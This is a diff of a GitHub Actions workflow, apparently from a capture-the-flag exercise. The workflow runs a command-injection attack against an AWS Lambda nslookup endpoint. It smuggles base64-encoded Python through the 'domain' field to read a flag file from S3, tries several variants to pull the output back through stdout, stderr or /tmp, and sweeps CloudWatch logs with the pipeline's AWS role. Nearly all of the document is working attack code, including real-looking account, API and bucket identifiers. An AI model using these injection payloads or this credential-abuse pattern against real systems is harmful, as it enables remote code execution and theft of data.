@@ -25,70 +25,81 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Inject print(flag.hex()) to CloudWatch, then read CW logs
+      - name: Capture Lambda stdout response
         run: |
           URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
+          echo "# response capture $(date -u)" > response_dump.txt
 
-          echo "=== Step 1: Inject flag print into Lambda stdout (-> CloudWatch) ==="
-          # Python: read flag, print hex to stdout so Lambda captures it in CloudWatch logs
-          PY="import boto3;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();print('FLAG_HEX:'+flag.hex());print('FLAG_B64:'+__import__('base64').b64encode(flag).decode());print('FLAG_LEN:'+str(len(flag)))"
+          # Inject Python that prints flag hex to stdout
+          # If Lambda captures subprocess stdout, the flag appears in the response body
+          PY="import boto3;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();print('FLAG_HEX:'+flag.hex());print('FLAG_ASCII:'+flag.decode('latin-1'));print('FLAG_LEN:'+str(len(flag)))"
           B64=$(echo -n "$PY" | base64 -w0)
-          curl -v -X POST "$URL" \
+
+          echo "=== curl response with stdout injection ===" | tee -a response_dump.txt
+          curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
-            -d "{\"domain\":\"x; echo $B64 | base64 -d | python3 #\"}" 2>&1
-          echo ""
-          echo "=== Lambda response captured above ==="
+            -d "{\"domain\":\"x; echo $B64 | base64 -d | python3 #\"}" | tee -a response_dump.txt
+          echo "" | tee -a response_dump.txt
 
-          echo "=== Step 2: List Lambda CloudWatch log groups ==="
-          aws logs describe-log-groups --region us-east-1 2>&1 | head -100
+          # Also try with stderr redirect to stdout
+          PY2="import boto3,sys;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();sys.stderr.write('FLAG_HEX:'+flag.hex()+'\n');print('FLAG_HEX:'+flag.hex())"
+          B64_2=$(echo -n "$PY2" | base64 -w0)
 
-          echo "=== Step 3: Try to find Lambda function log group ==="
-          for prefix in "/aws/lambda" "/aws/lambda/nslookup" "/aws/lambda/codec" "/aws/lambda/dev"; do
-            echo "--- Trying prefix: $prefix ---"
-            aws logs describe-log-groups --log-group-name-prefix "$prefix" --region us-east-1 2>&1
-          done
-
-          echo "=== Step 4: Check Lambda response body for flag ==="
-          RESPONSE=$(curl -s -X POST "$URL" \
+          echo "=== curl response with stderr+stdout ===" | tee -a response_dump.txt
+          curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
-            -d "{\"domain\":\"x; echo $B64 | base64 -d | python3 #\"}")
-          echo "Response: $RESPONSE"
+            -d "{\"domain\":\"x; echo $B64_2 | base64 -d | python3 2>&1 #\"}" | tee -a response_dump.txt
+          echo "" | tee -a response_dump.txt
 
-      - name: Try to read CW logs if accessible
+          # Try writing to /tmp and then cat-ing it (if Lambda returns file content)
+          PY3="import boto3;s3=boto3.client('s3');flag=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();open('/tmp/flag.hex','w').write(flag.hex())"
+          B64_3=$(echo -n "$PY3" | base64 -w0)
+          INJ3="x; echo $B64_3 | base64 -d | python3; cat /tmp/flag.hex #"
+
+          echo "=== curl response with /tmp cat trick ===" | tee -a response_dump.txt
+          curl -s -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d "{\"domain\":\"$INJ3\"}" | tee -a response_dump.txt
+          echo "" | tee -a response_dump.txt
+
+          cat response_dump.txt
+
+      - name: Check CloudWatch logs with broad IAM scan
         run: |
-          echo "=== CloudWatch log group search ==="
-          aws logs describe-log-groups --region us-east-1 2>&1 > cw_groups.txt
-          cat cw_groups.txt
+          echo "=== All available CW log groups ===" >> response_dump.txt
+          aws logs describe-log-groups --region us-east-1 2>&1 >> response_dump.txt || true
 
-          echo "=== Try direct Lambda function name guesses ==="
-          for fname in nslookup codec-nslookup codec dev-nslookup lambda-nslookup dns-lookup; do
-            GROUP="/aws/lambda/$fname"
-            echo "--- Checking $GROUP ---"
-            STREAMS=$(aws logs describe-log-streams \
-              --log-group-name "$GROUP" \
-              --order-by LastEventTime \
-              --descending \
-              --max-items 3 \
-              --region us-east-1 2>&1)
-            echo "$STREAMS"
-            if echo "$STREAMS" | grep -q "logStreamName"; then
-              STREAM=$(echo "$STREAMS" | python3 -c "import sys,json; data=json.load(sys.stdin); print(data['logStreams'][0]['logStreamName'])" 2>/dev/null)
-              echo "Reading stream: $STREAM"
-              aws logs get-log-events \
-                --log-group-name "$GROUP" \
-                --log-stream-name "$STREAM" \
-                --limit 50 \
-                --region us-east-1 2>&1 | grep -i "flag\|FLAG\|hex\|b64" || true
-            fi
-          done
+          echo "=== Lambda log groups ===" >> response_dump.txt
+          aws logs describe-log-groups --log-group-name-prefix "/aws/lambda" --region us-east-1 2>&1 >> response_dump.txt || true
 
-          echo "=== Also check API GW logs ==="
-          aws logs describe-log-groups --log-group-name-prefix "API-Gateway" --region us-east-1 2>&1 | head -50
+          # Check every Lambda log group for recent events containing FLAG
+          aws logs describe-log-groups --region us-east-1 2>/dev/null | \
+            grep '"logGroupName"' | grep -oP '(?<="logGroupName": ")[^"]+' | \
+            while IFS= read -r group; do
+              echo "--- $group ---" >> response_dump.txt
+              STREAM=$(aws logs describe-log-streams \
+                --log-group-name "$group" \
+                --order-by LastEventTime \
+                --descending \
+                --max-items 1 \
+                --region us-east-1 2>/dev/null | \
+                grep '"logStreamName"' | grep -oP '(?<="logStreamName": ")[^"]+' | head -1)
+              if [ -n "$STREAM" ]; then
+                aws logs get-log-events \
+                  --log-group-name "$group" \
+                  --log-stream-name "$STREAM" \
+                  --limit 20 \
+                  --region us-east-1 2>/dev/null | \
+                  grep -i "FLAG\|hex\|356\|codec" >> response_dump.txt || true
+              fi
+            done
+
+          cat response_dump.txt
 
       - name: Commit results
         run: |
           git config user.email "bot@github-actions"
           git config user.name "GitHub Actions"
-          git add cw_groups.txt 2>/dev/null || true
-          git commit -m "cloudwatch log exfil attempt" || echo "Nothing to commit"
+          git add response_dump.txt
+          git commit -m "response capture + CW scan" || echo "Nothing to commit"
           git push origin corgi
